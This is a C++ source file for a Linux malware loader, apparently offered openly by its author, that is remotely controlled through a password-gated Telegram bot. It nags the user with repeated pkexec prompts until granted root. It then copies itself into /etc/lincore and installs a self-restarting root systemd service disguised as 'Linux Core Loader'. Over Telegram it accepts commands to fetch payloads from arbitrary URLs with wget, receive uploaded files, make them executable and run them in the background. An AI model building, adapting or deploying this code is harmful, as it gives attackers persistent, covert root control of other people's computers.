// CREATOR 
// GitHub https://github.com/cppandpython
// NAME: Vladislav 
// SURNAME: Khudash  
// AGE: 17

// DATE: 03.12.2025
// APP: LOADER_LINUX
// TYPE: LOADER
// VERSION: LATEST
// PLATFORM: ANY


//-
//--
//---
//----
//-----
//------
#define TOKEN "HERE IS THE TELEGRAM BOT TOKEN"
#define PASSWORD "HERE IS THE PASSWORD FOR THE SESSION WITH THE BOT"
//------
//-----
//----
//---
//--
//-




#include <string> 
#include <sstream>
#include <fstream>
#include <filesystem>
#include <unistd.h>
#include <tgbot/tgbot.h>


#define PATH "/etc/lincore"
#define PATH_MODULE (PATH "/.module")
#define PATH_FILE (PATH "/lincore")
#define PATH_SERVICE "/etc/systemd/system/lincore.service"


namespace fs = std::filesystem;


void write_file(std::string path, std::string data) {
    std::ofstream file(path);
    file << data << std::endl;
    file.close();
}


bool get_next_token(std::istringstream& iss, std::string& token) {
    char c;

    token.clear();

    while (iss.get(c)) {
        if (!isspace(c)) {
            break;
        }
    }

    if (iss.eof()) {
        return false;
    }

    if (c == '"') { 
        while (iss.get(c)) {
            if (c == '"') {
                break;
            }

            token += c;
        }
    } 
    else { 
        token += c;

        while (iss.get(c)) {
            if (isspace(c)) {
                break;
            }

            token += c;
        }
    }

    return true;
}


bool parse_load(std::string text, std::string &url, std::string &name) {
    std::istringstream iss(text);
    std::string word;

    if ((!get_next_token(iss, word)) || (word != "load")) {
        return false;
    }

    if (!get_next_token(iss, url)) {
        return false;
    }

    if ((!get_next_token(iss, word)) || (word != "-n")) {
        return false;
    }

    if (!get_next_token(iss, name)) {
        return false;
    }

    return true;
}


int load_url(std::string url, std::string name) {
    std::string command = "wget -q \"" + url + "\" -O \"" + name + "\"";
    return system(command.c_str());
}


int init(char *current_file) {
    if (!fs::exists("/etc/systemd/system")) {
        return -1;
    }

    if (getuid() != 0) {
        std::string query = "pkexec ";query += current_file;
        while (system(query.c_str()) != 0);
        return -1;
    }

    if (!fs::exists(PATH)) {
        fs::create_directory(PATH);
    }

    if (!fs::exists(PATH_MODULE)) {
        fs::create_directory(PATH_MODULE);
    }
    
    if (!fs::exists(PATH_FILE)) {
        fs::copy(current_file, PATH_FILE);
    }

    if (!fs::exists(PATH_SERVICE)) {
        write_file(PATH_SERVICE, R"(
[Unit]
Description=Linux Core Loader

[Service]
ExecStart=/etc/lincore/lincore
WorkingDirectory=/etc/lincore
User=root
Restart=always
RestartSec=5s

[Install]
WantedBy=default.target
)");
        system("systemctl daemon-reload && systemctl enable --now lincore.service && clear");
        return -1;
    }

    return 0;
}


void bot() {
    TgBot::Bot bot(TOKEN);

    bot.getEvents().onAnyMessage([&bot](TgBot::Message::Ptr message) {
        int64_t chat_id = message->chat->id;
        auto document = message->document;
        std::string text = message->text;
        std::string userid = std::to_string(message->from->id);

        std::string user_session = std::string(PATH) + "/." + userid;

        if (!fs::exists(user_session)) {
            if (text == PASSWORD) {
                write_file(user_session, "");
                bot.getApi().sendMessage(chat_id, "Entered session");
                return;
            }
            else {
                bot.getApi().sendMessage(chat_id, "Enter password to connect to this session");
                return;
            }
        }

        if (StringTools::startsWith(text, "help")) {
            bot.getApi().sendMessage(chat_id, R"(
Command                   Description
-------                   -----------                                                                                                           
help                      Help menu
load                      Download module Internet
run                       Run module
del                       Delete module
module                    List of installed modules
)");
        }
        else if (document) {
            std::string module_name = document->fileName;
            std::string file_path = std::string(PATH_MODULE) + "/" + module_name;

            write_file(file_path, bot.getApi().downloadFile(bot.getApi().getFile(document->fileId)->filePath));
            chmod(file_path.c_str(), 0755);

            bot.getApi().sendMessage(chat_id, "added module(" + module_name + ") [+]");
        }
        else if (StringTools::startsWith(text, "load")) { 
            if (text.length() > 5) {
                std::string url, name;

                if (parse_load(text, url, name)) {
                    if (load_url(url, std::string(PATH_MODULE) + "/" + name) == 0) {
                        bot.getApi().sendMessage(chat_id, "added module(" + name + ") [+]");
                    }
                    else {
                        bot.getApi().sendMessage(chat_id, "module(" + name + ") not added [-]");
                    }
                }
                else {
                    bot.getApi().sendMessage(chat_id, "(url or name) incorrect");
                }
            }
            else {
                bot.getApi().sendMessage(chat_id, "load (url) -n (module name)  -  Download module Internet");
            }
        }
        else if (StringTools::startsWith(text, "run")) { 
            if (text.length() > 4) {
                std::string module_name = text.substr(4);
                std::string run_module_path = std::string(PATH_MODULE) + "/" + module_name;

                if (fs::exists(run_module_path)) {
                    std::string run_command = "nohup \"" + run_module_path + "\" > /dev/null 2>&1 &";
                    system(run_command.c_str());
                    bot.getApi().sendMessage(chat_id, "ran module(" + module_name + ") [*]");
                }
                else {
                    bot.getApi().sendMessage(chat_id, "module(" + module_name + ") not exist");
                }
            }
            else {
                bot.getApi().sendMessage(chat_id, "run (module name)  -  Run module");
            }
        }
        else if (StringTools::startsWith(text, "del")) { 
            if (text.length() > 4) {
                std::string module_name = text.substr(4);
                std::string del_module_path = std::string(PATH_MODULE) + "/" + module_name;

                if (fs::exists(del_module_path)) {
                    fs::remove(del_module_path);

                    if (!fs::exists(del_module_path)) {
                        bot.getApi().sendMessage(chat_id, "deleted module(" + module_name + ") [+]");
                    }
                    else {
                        bot.getApi().sendMessage(chat_id, "module(" + module_name + ") not deleted [-]");
                    }
                }
                else {
                    bot.getApi().sendMessage(chat_id, "module(" + module_name + ") not exist");
                }
            }
            else {
                bot.getApi().sendMessage(chat_id, "del (module name)  -  Delete module");
            }
        }
        else if (StringTools::startsWith(text, "module")) {
            for (const auto &entry : fs::directory_iterator(PATH_MODULE)) {
                bot.getApi().sendMessage(chat_id, entry.path().filename().string());
            }
        }
        else {
            bot.getApi().sendMessage(chat_id, "command (" + text + ") not found");
        }
    });

    TgBot::TgLongPoll longPoll(bot);while (true) { longPoll.start(); }
}


int main(int argc, char *argv[]) {
    if (init(argv[0]) == 0) {
        while (true) {
            try {
                bot();
            }
            catch (std::exception&) {
                sleep(5);
            }
        }
    }

    return 0;
}
